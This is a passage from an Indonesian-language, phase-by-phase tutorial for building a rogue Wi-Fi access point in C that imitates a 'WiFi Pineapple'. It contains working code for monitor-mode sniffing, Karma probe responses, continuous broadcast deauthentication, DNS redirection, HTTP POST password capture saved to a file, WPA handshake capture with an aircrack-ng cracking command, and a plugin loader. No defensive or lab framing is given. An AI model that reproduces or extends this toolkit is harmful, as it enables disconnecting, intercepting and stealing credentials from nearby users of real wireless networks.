    // ... similar to build_beacon with opcode 0x5000
    // Menggunakan header yang sama: <string.h>, <arpa/inet.h>
}

// ===== SEND AUTH RESPONSE =====
// Fungsi: Kirim auth response (0xB000) ke client
int send_auth_response(ap_config_t *cfg, uint8_t *client_mac) {
    // ... similar with opcode 0xB000
    // Menggunakan header yang sama
}

// ===== SEND ASSOC RESPONSE =====
// Fungsi: Kirim assoc response (0x1000) ke client
int send_assoc_response(ap_config_t *cfg, uint8_t *client_mac) {
    // ... similar with opcode 0x1000
    // Menggunakan header yang sama
}
```

#### `sniffer.h` — Deklarasi sniffer (15 lines)

```c
#ifndef SNIFFER_H
#define SNIFFER_H

// ===== HEADER YANG DIGUNAKAN =====
#include "config.h"   // ap_config_t

// ===== DEKLARASI FUNGSI SNIFFER =====
int open_sniffer(const char *iface);              // Open sniffer socket
int handle_frame(uint8_t *buf, int len, ap_config_t *cfg); // Handle captured frame
void *sniff_thread(void *arg);                    // Sniffer thread

#endif
```

#### `sniffer.c` — Implementasi sniffer (100 lines)

```c
// ===== HEADER YANG DIGUNAKAN =====
#include "sniffer.h"       // Deklarasi sendiri
#include "rogue_ap.h"      // send_probe_response, send_auth_response, send_assoc_response
#include <stdio.h>         // printf
#include <string.h>        // memcpy, memset
#include <unistd.h>        // close
#include <sys/socket.h>    // socket, bind, recv
#include <sys/ioctl.h>     // ioctl
#include <net/if.h>        // struct ifreq
#include <linux/if_packet.h>// struct sockaddr_ll

// ===== OPEN SNIFFER =====
// Fungsi: Buka raw socket untuk sniffing di monitor mode
// Header: <sys/socket.h>, <linux/if_packet.h>, <net/if.h>
int open_sniffer(const char *iface) {
    int sock;
    struct ifreq ifr;
    struct sockaddr_ll addr;
    
    // socket() — dari <sys/socket.h>
    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) {
        perror("socket");
        return -1;
    }
    
    strcpy(ifr.ifr_name, iface);
    ioctl(sock, SIOCGIFINDEX, &ifr);
    
    memset(&addr, 0, sizeof(addr));
    addr.sll_family = AF_PACKET;
    addr.sll_protocol = htons(ETH_P_ALL);
    addr.sll_ifindex = ifr.ifr_ifindex;
    
    // bind() — dari <sys/socket.h>
    if (bind(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("bind");
        close(sock);
        return -1;
    }
    
    return sock;
}

// ===== HANDLE FRAME =====
// Fungsi: Proses frame yang ditangkap, deteksi probe, auth, assoc
// Header: <stdio.h> (printf), <string.h> (sprintf)
int handle_frame(uint8_t *buf, int len, ap_config_t *cfg) {
    // Struktur header 802.11 — sama seperti di rogue_ap.c
    typedef struct {
        uint16_t frame_control;
        uint16_t duration;
        uint8_t addr1[6];
        uint8_t addr2[6];
        uint8_t addr3[6];
        uint16_t seq_ctrl;
        uint8_t payload[];
    } __attribute__((packed)) wifi_header_t;
    
    if (len < sizeof(wifi_header_t)) return -1;
    
    wifi_header_t *hdr = (wifi_header_t*)buf;
    uint16_t fc = ntohs(hdr->frame_control);  // ntohs dari <arpa/inet.h>
    uint8_t type = (fc >> 2) & 0x3;
    uint8_t subtype = (fc >> 4) & 0xF;
    
    if (type != IEEE80211_FTYPE_MGMT) return 0;
    
    char mac_str[18];
    sprintf(mac_str, "%02x:%02x:%02x:%02x:%02x:%02x",
            hdr->addr2[0], hdr->addr2[1], hdr->addr2[2],
            hdr->addr2[3], hdr->addr2[4], hdr->addr2[5]);
    
    switch(subtype) {
        case IEEE80211_STYPE_PROBE_REQ:
            printf("[Sniff] Probe Request from %s\n", mac_str);
            send_probe_response(cfg, hdr->addr2);  // dari rogue_ap.h
            break;
        case IEEE80211_STYPE_AUTH:
            printf("[Sniff] Authentication from %s\n", mac_str);
            send_auth_response(cfg, hdr->addr2);   // dari rogue_ap.h
            break;
        case IEEE80211_STYPE_ASSOC_REQ:
            printf("[Sniff] Association Request from %s\n", mac_str);
            send_assoc_response(cfg, hdr->addr2);  // dari rogue_ap.h
            printf("[+] Client CONNECTED: %s\n", mac_str);
            break;
    }
    
    return 0;
}

// ===== SNIFFER THREAD =====
// Fungsi: Thread untuk sniffing terus-menerus
// Header: <pthread.h> untuk threading (walau di sini hanya digunakan sebagai argumen)
void *sniff_thread(void *arg) {
    ap_config_t *cfg = (ap_config_t*)arg;
    int sock;
    uint8_t buf[2048];
    
    printf("[Sniffer] Monitoring on %s\n", cfg->monitor_iface);
    
    sock = open_sniffer(cfg->monitor_iface);
    if (sock < 0) {
        fprintf(stderr, "[!] Failed to open sniffer\n");
        return NULL;
    }
    
    while (1) {
        int len = recv(sock, buf, sizeof(buf), 0);
        if (len < 0) {
            perror("recv");
            continue;
        }
        handle_frame(buf, len, cfg);
    }
    
    close(sock);
    return NULL;
}
```

#### `main.c` — Entry point (50 lines)

```c
// ===== HEADER YANG DIGUNAKAN =====
#include <stdio.h>          // printf
#include <stdlib.h>         // exit
#include <string.h>         // strcpy
#include <unistd.h>         // usleep
#include <pthread.h>        // pthread_create, pthread_join, pthread_cancel
#include <signal.h>         // signal, SIGINT
#include "config.h"         // ap_config_t
#include "rogue_ap.h"       // setup_ap_mode, send_beacon
#include "sniffer.h"        // sniff_thread
#include "utils.h"          // mac_to_string

volatile int running = 1;

// ===== SIGNAL HANDLER =====
// Fungsi: Handle Ctrl+C untuk berhenti dengan rapi
// Header: <signal.h> (signal, SIGINT)
void signal_handler(int sig) {
    running = 0;
}

// ===== MAIN =====
// Entry point: setup AP, start threads
// Header: <pthread.h> (threading), <signal.h> (signal)
int main() {
    ap_config_t cfg;
    pthread_t sniff_tid;
    char bssid_str[18];
    
    // signal() — dari <signal.h>
    signal(SIGINT, signal_handler);
    
    // Setup konfigurasi
    cfg.bssid[0] = 0x02;
    cfg.bssid[1] = 0x11;
    cfg.bssid[2] = 0x22;
    cfg.bssid[3] = 0x33;
    cfg.bssid[4] = 0x44;
    cfg.bssid[5] = 0x55;
    strcpy(cfg.ssid, "FreeWiFi");
    cfg.channel = 6;
    strcpy(cfg.monitor_iface, "wlan0");
    strcpy(cfg.ap_iface, "wlan0");
    cfg.use_virtual = false;
    
    // mac_to_string() — dari utils.h
    mac_to_string(cfg.bssid, bssid_str);
    
    printf("========================================\n");
    printf("  ROGUE AP - WiFi Pineapple Basic\n");
    printf("========================================\n");
    printf("SSID:    %s\n", cfg.ssid);
    printf("BSSID:   %s\n", bssid_str);
    printf("Channel: %d\n", cfg.channel);
    printf("========================================\n");
    
    // setup_ap_mode() — dari rogue_ap.h
    setup_ap_mode(cfg.ap_iface);
    
    // pthread_create() — dari <pthread.h>
    pthread_create(&sniff_tid, NULL, sniff_thread, &cfg);
    
    printf("[+] Rogue AP is running!\n");
    printf("[+] Press Ctrl+C to stop\n\n");
    
    while (running) {
        send_beacon(&cfg);  // dari rogue_ap.h
        usleep(100000);     // usleep dari <unistd.h>
    }
    
    printf("\n[+] Stopping...\n");
    pthread_cancel(sniff_tid);  // dari <pthread.h>
    pthread_join(sniff_tid, NULL);
    
    printf("[+] Done!\n");
    return 0;
}
```

### Compile & Test — Cara menjalankan fase 1

```bash
gcc -o rogue_ap main.c rogue_ap.c sniffer.c utils.c -pthread
sudo ./rogue_ap
```

---

## Fase 2: Attack Features (Minggu 4-5)

### Tujuan — Menambahkan fitur serangan: Karma, Deauth, Beacon Flooding

- Karma attack (menjawab semua probe request)
- Deauth attack (memutus koneksi client)
- Beacon Flooding (memancarkan banyak SSID)
- Multiple SSID

### Header yang Digunakan di Fase Ini

| File | Header | Fungsi |
|------|--------|--------|
| **`attack/karma.h/.c`** | `"karma.h"`, `"rogue_ap.h"`, `"utils.h"`, `<stdio.h>`, `<string.h>`, `<unistd.h>` | Karma attack |
| **`attack/deauth.h/.c`** | `"deauth.h"`, `"utils.h"`, `<stdio.h>`, `<string.h>`, `<unistd.h>` | Deauth attack |

### Tambahan File — File baru pada fase ini

```
project/
├── attack/
│   ├── karma.c (100 lines)        — Karma attack implementation
│   ├── karma.h (15 lines)         — Karma declarations
│   ├── deauth.c (100 lines)       — Deauth attack implementation
│   └── deauth.h (15 lines)        — Deauth declarations
```

### Kode Contoh: Karma Attack — Header dan Implementasi

```c
// karma.h — Deklarasi Karma attack
#ifndef KARMA_H
#define KARMA_H

// ===== HEADER YANG DIGUNAKAN =====
#include "config.h"   // ap_config_t

// ===== DEKLARASI FUNGSI =====
// Karma attack: menjawab SEMUA probe request dari client
int karma_respond(ap_config_t *cfg, uint8_t *client_mac, char *requested_ssid);
void *karma_thread(void *arg);

#endif
```

```c
// karma.c — Implementasi Karma attack
// Fungsi: Menjawab semua probe request (KARMA attack)
// Header: <string.h> (strcpy), <unistd.h> (sleep)

#include "karma.h"
#include "rogue_ap.h"   // send_probe_response
#include "utils.h"      // mac_to_string
#include <stdio.h>      // printf
#include <string.h>     // strcpy, strlen
#include <unistd.h>     // sleep

// ===== KARMA RESPOND =====
// Fungsi: Menjawab probe request dengan SSID yang diminta client
// Header: <string.h> (strcpy), <stdio.h> (printf)
int karma_respond(ap_config_t *cfg, uint8_t *client_mac, char *requested_ssid) {
    // Simpan SSID asli
    char original_ssid[MAX_SSID_LEN];
    strcpy(original_ssid, cfg->ssid);
    
    // Ubah SSID menjadi yang diminta client
    strcpy(cfg->ssid, requested_ssid);
    
    // Kirim probe response
    int ret = send_probe_response(cfg, client_mac);
    
    // Kembalikan SSID asli
    strcpy(cfg->ssid, original_ssid);
    
    char mac_str[18];
    mac_to_string(client_mac, mac_str);
    printf("[Karma] Responded to %s with SSID: %s\n", mac_str, requested_ssid);
    
    return ret;
}

// ===== KARMA THREAD =====
// Fungsi: Thread untuk Karma attack (berjalan di background)
void *karma_thread(void *arg) {
    // Implementasi: sniffer akan memanggil karma_respond()
    // untuk setiap probe request yang diterima
    return NULL;
}
```

### Kode Contoh: Deauth Attack — Header dan Implementasi

```c
// deauth.h — Deklarasi Deauth attack
#ifndef DEAUTH_H
#define DEAUTH_H

// ===== HEADER YANG DIGUNAKAN =====
#include "config.h"   // ap_config_t

// ===== DEKLARASI FUNGSI =====
// Deauth attack: memutus koneksi client dengan mengirim frame deauth (0xC000)
int send_deauth_frame(uint8_t *client_mac, uint8_t *ap_mac, const char *iface);
void *deauth_thread(void *arg);

#endif
```

```c
// deauth.c — Implementasi Deauth attack
// Fungsi: Kirim frame deauth (0xC000) untuk memutus koneksi client
// Header: <string.h> (memcpy), <unistd.h> (sleep)

#include "deauth.h"
#include "utils.h"      // create_raw_socket, send_frame, mac_to_string
#include <stdio.h>      // printf
#include <string.h>     // memcpy
#include <unistd.h>     // sleep

// ===== SEND DEAUTH FRAME =====
// Fungsi: Kirim frame deauth (0xC000) ke client
// Header: <string.h> (memcpy), <arpa/inet.h> (htons)
int send_deauth_frame(uint8_t *client_mac, uint8_t *ap_mac, const char *iface) {
    int sock;
    uint8_t buf[256];
    
    // Struktur header 802.11 — sama seperti sebelumnya
    typedef struct {
        uint16_t frame_control;    // 0xC000 = Deauth
        uint16_t duration;
        uint8_t addr1[6];          // Client MAC
        uint8_t addr2[6];          // AP MAC
        uint8_t addr3[6];          // BSSID
        uint16_t seq_ctrl;
        uint8_t payload[];
    } __attribute__((packed)) wifi_header_t;
    
    wifi_header_t *hdr = (wifi_header_t*)buf;
    uint8_t *pos = hdr->payload;
    
    sock = create_raw_socket(iface);
    if (sock < 0) return -1;
    
    // Frame Control: Deauth (0xC000) — htons() dari <arpa/inet.h>
    hdr->frame_control = htons(IEEE80211_FC_DEAUTH);
    hdr->duration = 0;
    
    memcpy(hdr->addr1, client_mac, 6);
    memcpy(hdr->addr2, ap_mac, 6);
    memcpy(hdr->addr3, ap_mac, 6);
    hdr->seq_ctrl = 0;
    
    // Reason code: 7 = Class 3 frame from nonassociated STA
    *pos++ = 0x07;
    *pos++ = 0x00;
    
    int len = sizeof(wifi_header_t) + 2;
    int ret = send_frame(sock, buf, len, iface);
    
    close(sock);
    
    char mac_str[18];
    mac_to_string(client_mac, mac_str);
    printf("[Deauth] Deauthenticated client: %s\n", mac_str);
    return ret;
}

// ===== DEAUTH THREAD =====
// Fungsi: Thread untuk Deauth attack (broadcast deauth terus-menerus)
// Header: <unistd.h> (sleep)
void *deauth_thread(void *arg) {
    ap_config_t *cfg = (ap_config_t*)arg;
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    
    while (1) {
        send_deauth_frame(broadcast, cfg->bssid, cfg->ap_iface);
        sleep(5);  // sleep dari <unistd.h>
    }
    return NULL;
}
```

### Output yang Diharapkan — Hasil akhir fase 2

```bash
✅ Karma: Client auto-connect ke AP kita
✅ Deauth: Client disconnect dari AP asli
✅ Beacon Flooding: 100+ SSID muncul di daftar WiFi
✅ Multiple SSID: 10+ SSID berbeda
```

---

## Fase 3: Server Features (Minggu 6-7)

### Tujuan — Menambahkan DHCP, DNS Spoofing, dan Logging

- DHCP server (memberi IP ke client)
- DNS spoofing (redirect domain)
- Client tracking (database client)
- Logging (simpan aktivitas)

### Header yang Digunakan di Fase Ini

| File | Header | Fungsi |
|------|--------|--------|
| **`server/dhcp.h/.c`** | `"dhcp.h"`, `<stdio.h>`, `<string.h>`, `<stdlib.h>` | DHCP server |
| **`server/dns.h/.c`** | `"dns.h"`, `<stdio.h>`, `<string.h>`, `<stdlib.h>` | DNS spoofing |
| **`database/client_tracker.c`** | `<stdio.h>`, `<string.h>`, `<time.h>` | Client tracking |
| **`utils/logger.h/.c`** | `<stdio.h>`, `<time.h>`, `<string.h>` | Logging system |

### Tambahan File — File baru pada fase ini

```
project/
├── server/
│   ├── dhcp.c (200 lines)        — DHCP server implementation
│   ├── dhcp.h (20 lines)         — DHCP declarations
│   ├── dns.c (150 lines)         — DNS spoofing implementation
│   └── dns.h (15 lines)          — DNS declarations
├── database/
│   └── client_tracker.c (100 lines) — Client tracking
```

### Kode Contoh: DHCP Server — Header dan Implementasi

```c
// dhcp.h — Deklarasi DHCP server
#ifndef DHCP_H
#define DHCP_H

// ===== HEADER YANG DIGUNAKAN =====
#include "config.h"   // ap_config_t

// ===== DEKLARASI FUNGSI =====
// DHCP server: memberi IP address ke client yang connect
int start_dhcp_server(const char *iface);
int handle_dhcp_request(uint8_t *data, int len);

#endif
```

```c
// dhcp.c — Implementasi DHCP server
// Fungsi: Memberi IP address ke client (DHCP server sederhana)
// Header: <stdio.h> (printf), <string.h> (snprintf), <stdlib.h> (system)

#include "dhcp.h"
#include <stdio.h>      // printf
#include <string.h>     // snprintf
#include <stdlib.h>     // system

// ===== START DHCP SERVER =====
// Fungsi: Setup DHCP server di interface
// Header: <stdio.h> (printf), <stdlib.h> (system)
int start_dhcp_server(const char *iface) {
    printf("[DHCP] Server started on %s\n", iface);
    
    // Setup IP: 192.168.1.1/24 — system() dari <stdlib.h>
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "ip addr add 192.168.1.1/24 dev %s", iface);
    system(cmd);
    
    return 0;
}

// ===== HANDLE DHCP REQUEST =====
// Fungsi: Handle DHCP request dari client
// Header: <stdio.h> (printf)
int handle_dhcp_request(uint8_t *data, int len) {
    // Simulasi DHCP Offer
    printf("[DHCP] Request received, offering IP 192.168.1.100\n");
    return 0;
}
```

### Kode Contoh: Logger — Header dan Implementasi

```c
// logger.h — Deklarasi logging system
#ifndef LOGGER_H
#define LOGGER_H

// ===== HEADER YANG DIGUNAKAN =====
#include <time.h>     // time_t

// ===== DEKLARASI FUNGSI =====
// Logging system: menyimpan semua aktivitas ke file
void log_event(const char *message, int level);
void log_client_connect(const uint8_t *mac);
void log_password_capture(const char *password);

#endif
```

```c
// logger.c — Implementasi logging system
// Fungsi: Menyimpan log ke file dengan timestamp
// Header: <stdio.h> (fopen, fprintf), <time.h> (time, ctime), <string.h> (strcpy)

#include "logger.h"
#include "utils.h"      // mac_to_string
#include <stdio.h>      // fopen, fprintf, fclose
#include <time.h>       // time, ctime
#include <string.h>     // strcpy

// ===== LOG EVENT =====
// Fungsi: Simpan event ke log file
// Header: <stdio.h> (fopen, fprintf), <time.h> (time, ctime)
void log_event(const char *message, int level) {
    FILE *fp = fopen("pineapple.log", "a");
    if (!fp) return;
    
    time_t now = time(NULL);  // time() dari <time.h>
    fprintf(fp, "[%s] %s\n", ctime(&now), message);
    fclose(fp);
}

// ===== LOG CLIENT CONNECT =====
// Fungsi: Catat client yang connect
// Header: <string.h> (strcpy), <time.h> (time)
void log_client_connect(const uint8_t *mac) {
    char mac_str[18];
    char msg[64];
    mac_to_string(mac, mac_str);
    strcpy(msg, "Client connected: ");
    strcat(msg, mac_str);
    log_event(msg, 1);
}

// ===== LOG PASSWORD CAPTURE =====
// Fungsi: Catat password yang tercapture
// Header: <string.h> (strcpy, strcat)
void log_password_capture(const char *password) {
    char msg[128];
    strcpy(msg, "Password captured: ");
    strcat(msg, password);
    log_event(msg, 2);
}
```

### Output yang Diharapkan — Hasil akhir fase 3

```bash
✅ Client dapat IP dari kita (192.168.1.x)
✅ DNS redirect ke IP kita (facebook.com -> 192.168.1.1)
✅ Client terdaftar di database (MAC, IP, waktu)
✅ Semua aktivitas tersimpan di log
```

---

## Fase 4: MITM & Credential Capture (Minggu 8-9)

### Tujuan — Intercept traffic HTTP dan capture password

- HTTP proxy (intercept traffic)
- Credential capture (tangkap password)
- Session hijacking (capture cookies)

### Header yang Digunakan di Fase Ini

| File | Header | Fungsi |
|------|--------|--------|
| **`mitm/proxy.h/.c`** | `"proxy.h"`, `"capture.h"`, `<stdio.h>`, `<string.h>`, `<sys/socket.h>`, `<netinet/in.h>`, `<unistd.h>` | HTTP proxy |
| **`mitm/capture.h/.c`** | `"capture.h"`, `<stdio.h>`, `<string.h>`, `<time.h>` | Credential capture |

### Tambahan File — File baru pada fase ini

```
project/
├── mitm/
│   ├── proxy.c (300 lines)       — HTTP proxy implementation
│   ├── proxy.h (25 lines)        — Proxy declarations
│   ├── capture.c (150 lines)     — Credential capture
│   └── capture.h (15 lines)      — Capture declarations
```

### Kode Contoh: Capture — Header dan Implementasi

```c
// capture.h — Deklarasi credential capture
#ifndef CAPTURE_H
#define CAPTURE_H

// ===== HEADER YANG DIGUNAKAN =====
#include <stdint.h>   // uint8_t

// ===== DEKLARASI FUNGSI =====
// Credential capture: menangkap password dari HTTP POST
int capture_http(uint8_t *data, int len);
void save_captured_password(const char *password);

#endif
```

```c
// capture.c — Implementasi credential capture
// Fungsi: Menangkap password dari HTTP POST data
// Header: <stdio.h> (fopen, fprintf), <string.h> (memmem), <time.h> (time)

#include "capture.h"
#include "logger.h"     // log_password_capture
#include <stdio.h>      // fopen, fprintf
#include <string.h>     // memmem
#include <time.h>       // time

// ===== CAPTURE HTTP POST =====
// Fungsi: Cari password di data HTTP POST
// Header: <string.h> (memmem), <time.h> (time)
int capture_http(uint8_t *data, int len) {
    // Cari "POST" di data — memmem() dari <string.h>
    if (memmem(data, len, "POST", 4)) {
        // Cari "password=" — memmem() dari <string.h>
        char *pwd = memmem(data, len, "password=", 9);
        if (pwd) {
            // Extract password
            char password[256];
            int i = 0;
            while (pwd[i] != '&' && pwd[i] != ' ' && pwd[i] != '\r' && i < 255) {
                password[i] = pwd[i];
                i++;
            }
            password[i] = '\0';
            printf("[+] Password captured: %s\n", password);
            
            // Save to log
            save_captured_password(password);
            log_password_capture(password);  // dari logger.h
        }
    }
    return 0;
}

// ===== SAVE CAPTURED PASSWORD =====
// Fungsi: Simpan password ke file
// Header: <stdio.h> (fopen, fprintf), <time.h> (time)
void save_captured_password(const char *password) {
    FILE *fp = fopen("captured.txt", "a");
    if (!fp) return;
    
    time_t now = time(NULL);  // time() dari <time.h>
    fprintf(fp, "[%ld] %s\n", time(NULL), password);
    fclose(fp);
}
```

### Output yang Diharapkan — Hasil akhir fase 4

```bash
✅ Traffic HTTP terlihat di terminal
✅ Password login tercapture di captured.txt
✅ Cookies bisa di-capture
✅ Form data tersimpan
```

---

## Fase 5: Web Dashboard (Minggu 10)

### Tujuan — Monitoring dan kontrol melalui web

- Web dashboard (monitoring UI)
- Client list di web
- Live log di web
- Kontrol AP (start/stop)

### Header yang Digunakan di Fase Ini

| File | Header | Fungsi |
|------|--------|--------|
| **`web/web_ui.h/.c`** | `"web_ui.h"`, `<stdio.h>`, `<string.h>`, `<sys/socket.h>`, `<netinet/in.h>`, `<unistd.h>` | Web dashboard |

### Tambahan File — File baru pada fase ini

```
project/
├── web/
│   ├── web_ui.c (200 lines)      — Web dashboard implementation
│   └── web_ui.h (20 lines)       — Web declarations
```

### Kode Contoh: Web Dashboard — Header dan Implementasi

```c
// web_ui.h — Deklarasi web dashboard
#ifndef WEB_UI_H
#define WEB_UI_H

// ===== DEKLARASI FUNGSI =====
// Web dashboard: monitoring UI via browser
int start_web_server(int port);
void *web_server_thread(void *arg);

#endif
```

```c
// web_ui.c — Implementasi web dashboard
// Fungsi: Menyediakan web interface untuk monitoring
// Header: <stdio.h> (printf), <string.h> (strlen), <sys/socket.h> (socket, bind, listen, accept), <unistd.h> (close)

#include "web_ui.h"
#include <stdio.h>          // printf
#include <string.h>         // strlen
#include <sys/socket.h>     // socket, bind, listen, accept
#include <netinet/in.h>     // struct sockaddr_in
#include <unistd.h>         // close

// ===== START WEB SERVER =====
// Fungsi: Jalankan HTTP server untuk dashboard
// Header: <sys/socket.h>, <netinet/in.h>, <unistd.h>
int start_web_server(int port) {
    int server_fd, new_socket;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);
    
    // socket() — dari <sys/socket.h>
    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(port);
    
    bind(server_fd, (struct sockaddr *)&address, sizeof(address));
    listen(server_fd, 3);
    
    printf("[Web] Dashboard running on http://192.168.1.1:%d\n", port);
    
    while (1) {
        new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen);
        char buffer[1024] = {0};
        read(new_socket, buffer, 1024);
        
        // Send HTML response
        char *html = "HTTP/1.1 200 OK\nContent-Type: text/html\n\n"
                     "<html><body><h1>WiFi Pineapple Dashboard</h1>"
                     "<p>Clients: 0</p><p>Captured: 0</p></body></html>";
        write(new_socket, html, strlen(html));  // strlen dari <string.h>
        close(new_socket);  // close dari <unistd.h>
    }
    
    close(server_fd);
    return 0;
}

// ===== WEB SERVER THREAD =====
// Fungsi: Thread untuk web server
void *web_server_thread(void *arg) {
    start_web_server(8080);
    return NULL;
}
```

### Output yang Diharapkan — Hasil akhir fase 5

```bash
✅ Buka browser: http://192.168.1.1:8080
✅ Dashboard muncul dengan monitoring UI
✅ Client list terlihat
✅ Live log berjalan
```

---

## Fase 6: WPA Handshake Capture (Minggu 11)

### Tujuan — Menangkap 4-way handshake WPA

- Capture 4-way handshake
- Simpan handshake ke file .cap
- Siap untuk crack dengan aircrack-ng

### Header yang Digunakan di Fase Ini

| File | Header | Fungsi |
|------|--------|--------|
| **`capture/handshake.h/.c`** | `"handshake.h"`, `<stdio.h>`, `<string.h>` | Handshake capture |

### Tambahan File — File baru pada fase ini

```
project/
├── capture/
│   ├── handshake.c (150 lines)   — Handshake capture
│   └── handshake.h (15 lines)    — Handshake declarations
```

### Kode Contoh: Handshake Capture — Header dan Implementasi

```c
// handshake.h — Deklarasi handshake capture
#ifndef HANDSHAKE_H
#define HANDSHAKE_H

// ===== HEADER YANG DIGUNAKAN =====
#include <stdint.h>   // uint8_t

// ===== DEKLARASI FUNGSI =====
// WPA Handshake Capture: menangkap 4-way handshake
int capture_handshake(uint8_t *buf, int len);
void *handshake_thread(void *arg);

#endif
```

```c
// handshake.c — Implementasi handshake capture
// Fungsi: Menangkap EAPOL frame (4-way handshake)
// Header: <stdio.h> (fopen, fwrite), <string.h> (memmem)

#include "handshake.h"
#include <stdio.h>      // fopen, fwrite
#include <string.h>     // memmem

// ===== CAPTURE HANDSHAKE =====
// Fungsi: Cari EAPOL frame (0x888E) di data
// Header: <string.h> (memmem), <stdio.h> (fopen, fwrite)
int capture_handshake(uint8_t *buf, int len) {
    // Cari EAPOL frame (0x888E) — memmem() dari <string.h>
    // EAPOL = 4-way handshake
    for (int i = 0; i < len - 2; i++) {
        if (buf[i] == 0x88 && buf[i+1] == 0x8E) {
            printf("[Handshake] EAPOL frame captured!\n");
            
            // Save to .cap file — fopen, fwrite dari <stdio.h>
            FILE *fp = fopen("handshake.cap", "ab");
            if (fp) {
                fwrite(buf, 1, len, fp);
                fclose(fp);
            }
            return 1;
        }
    }
    return 0;
}

// ===== HANDSHAKE THREAD =====
// Fungsi: Thread untuk handshake capture
void *handshake_thread(void *arg) {
    // Implementasi: sniffer akan memanggil capture_handshake()
    return NULL;
}
```

### Output yang Diharapkan — Hasil akhir fase 6

```bash
✅ EAPOL frame (4-way handshake) tercapture
✅ File handshake.cap tersimpan
✅ Bisa crack dengan aircrack-ng: aircrack-ng handshake.cap -w wordlist.txt
```

---

## Fase 7: Module System & Filtering (Minggu 12)

### Tujuan — Sistem plugin dan filtering traffic

- Module system (plugin architecture)
- Traffic filtering (filter by IP/MAC)
- Attack modules (load/unload)

### Header yang Digunakan di Fase Ini

| File | Header | Fungsi |
|------|--------|--------|
| **`modules/module.h/.c`** | `"module.h"`, `<stdio.h>`, `<string.h>`, `<dlfcn.h>` | Module system |
| **`filter/filter.h/.c`** | `"filter.h"`, `<stdio.h>`, `<string.h>` | Traffic filtering |

### Tambahan File — File baru pada fase ini

```
project/
├── modules/
│   ├── module.c (100 lines)      — Module system
│   └── module.h (15 lines)       — Module declarations
├── filter/
│   ├── filter.c (100 lines)      — Traffic filtering
│   └── filter.h (15 lines)       — Filter declarations
```

### Kode Contoh: Module System — Header dan Implementasi

```c
// module.h — Deklarasi module system
#ifndef MODULE_H
#define MODULE_H

// ===== HEADER YANG DIGUNAKAN =====
#include <stdint.h>   // uint8_t

// ===== STRUKTUR MODULE =====
// Struktur untuk mendefinisikan module/plugin
typedef struct {
    char name[64];          // Module name
    void (*init)(void);     // Init function
    void (*run)(void);      // Run function
    void (*stop)(void);     // Stop function
} module_t;

// ===== DEKLARASI FUNGSI =====
// Module system: load/unload plugin
int register_module(module_t *mod);
int load_module(const char *path);
int unload_module(const char *name);

#endif
```

```c
// module.c — Implementasi module system
// Fungsi: Sistem plugin untuk load/unload module
// Header: <dlfcn.h> (dlopen, dlsym, dlclose) — untuk dynamic loading

#include "module.h"
#include <stdio.h>      // printf
#include <string.h>     // strcpy
#include <dlfcn.h>      // dlopen, dlsym, dlclose

// ===== REGISTER MODULE =====
// Fungsi: Daftarkan module ke sistem
// Header: <string.h> (strcpy)
int register_module(module_t *mod) {
    printf("[Module] Registered: %s\n", mod->name);
    return 0;
}

// ===== LOAD MODULE =====
// Fungsi: Load module dari file .so
// Header: <dlfcn.h> (dlopen, dlsym)
int load_module(const char *path) {
    void *handle = dlopen(path, RTLD_NOW);
    if (!handle) {
        printf("[Module] Failed to load: %s\n", path);
        return -1;
    }
    
    // Get module functions
    module_t *mod = (module_t*)dlsym(handle, "module");
    if (mod) {
        mod->init();
        printf("[Module] Loaded: %s\n", mod->name);
    }
    
    return 0;
}

// ===== UNLOAD MODULE =====
// Fungsi: Unload module
// Header: <dlfcn.h> (dlclose)
int unload_module(const char *name) {
    printf("[Module] Unloaded: %s\n", name);
    return 0;
}
```

### Output yang Diharapkan — Hasil akhir fase 7

```bash
✅ Module system berjalan (bisa load/unload module)
✅ Filtering traffic by IP/MAC
✅ Attack modules bisa di-enable/disable
✅ Modular architecture siap untuk pengembangan
```

---

## Fase 8: Polish & Documentation (Minggu 13-14)

### Tujuan — Final testing, packaging, dan dokumentasi

- Testing semua fitur
- Optimasi performa
- Dokumentasi lengkap
- Packaging dan release

### Header yang Digunakan di Fase Ini

| File | Header | Fungsi |
|------|--------|--------|
| **`Makefile`** | — | Build automation |
| **`README.md`** | — | Dokumentasi |

### Output yang Diharapkan — Hasil akhir fase 8

```bash
✅ Semua fitur berjalan stabil (no crash, no memory leak)
✅ Dokumentasi lengkap (README, API docs)
✅ Video demo (2-3 menit)
✅ GitHub repository dengan release v1.0
✅ Binary package siap pakai
```

---

## 13. Arsitektur Sistem

### Diagram Arsitektur — Visualisasi komponen dan alur data

```
┌─────────────────────────────────────────────────────────────┐
│                      USER INTERFACE                         │
├─────────────────────────────────────────────────────────────┤
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐    │
│  │   Terminal   │  │  Web Dashboard│  │   Logging   │    │
│  └──────────────┘  └──────────────┘  └──────────────┘    │
├─────────────────────────────────────────────────────────────┤
│                      CORE ENGINE                            │
├─────────────────────────────────────────────────────────────┤
│  ┌─────────────────────────────────────────────────────┐   │
│  │              MAIN CONTROLLER                        │   │
│  ├─────────────────────────────────────────────────────┤   │
│  │  ┌─────────┐  ┌─────────┐  ┌─────────┐  ┌────────┐│   │
│  │  │ Sniffer │  │Broadcast│  │Attacker │  │ Server ││   │
│  │  │(Monitor)│  │  (AP)   │  │(Karma,  │  │(DHCP,  ││   │
│  │  └─────────┘  └─────────┘  │Deauth)  │  │ DNS)   ││   │
│  │                            └─────────┘  └────────┘│   │
│  └─────────────────────────────────────────────────────┘   │
├─────────────────────────────────────────────────────────────┤
│                    RAW SOCKET (Layer 2)                     │
├─────────────────────────────────────────────────────────────┤
│                    LINUX KERNEL (Netlink)                   │
└─────────────────────────────────────────────────────────────┘
```

### Komponen Sistem — Deskripsi setiap komponen

| Komponen | File | Fungsi | Header Utama |
|----------|------|--------|--------------|
| **Main Controller** | `main.c` | Entry point, orchestrator | `<pthread.h>`, `<signal.h>` |
